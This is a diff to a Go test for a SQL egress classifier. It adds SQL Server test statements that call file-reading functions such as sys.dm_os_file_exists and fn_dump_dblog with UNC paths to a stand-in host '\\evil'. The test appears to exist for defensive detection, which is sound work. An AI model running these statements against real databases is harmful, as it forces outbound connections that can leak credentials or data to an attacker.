@@ -34,6 +34,12 @@ func TestClassifySQLEgress(t *testing.T) {
 			`SELECT * FROM fn_get_audit_file('\\evil\x', default, default)`,
 			`SELECT * FROM fn_trace_gettable('\\evil\x.trc', default)`,
 			`SELECT * FROM [sys].[fn_xe_file_target_read_file]('\\evil\x', NULL, NULL, NULL)`,
+			`SELECT * FROM sys.dm_os_file_exists('\\evil\x')`,
+			`SELECT * FROM sys.dm_os_enumerate_filesystem('\\evil\x', '*')`,
+			`SELECT file_exists FROM [sys].[dm_os_file_exists](N'\\evil\x')`,
+			// any UNC path in the statement, whatever reads it
+			`SELECT * FROM sys.some_new_function('\\evil\share\x')`,
+			`SELECT x FROM t WHERE y = dbo.reads(N'//evil/share')`,
 			`SELECT * FROM fn_dump_dblog(NULL,NULL,'DISK',1,'\\evil\x.bak',DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT)`,
 		},
 		"clickhouse": {
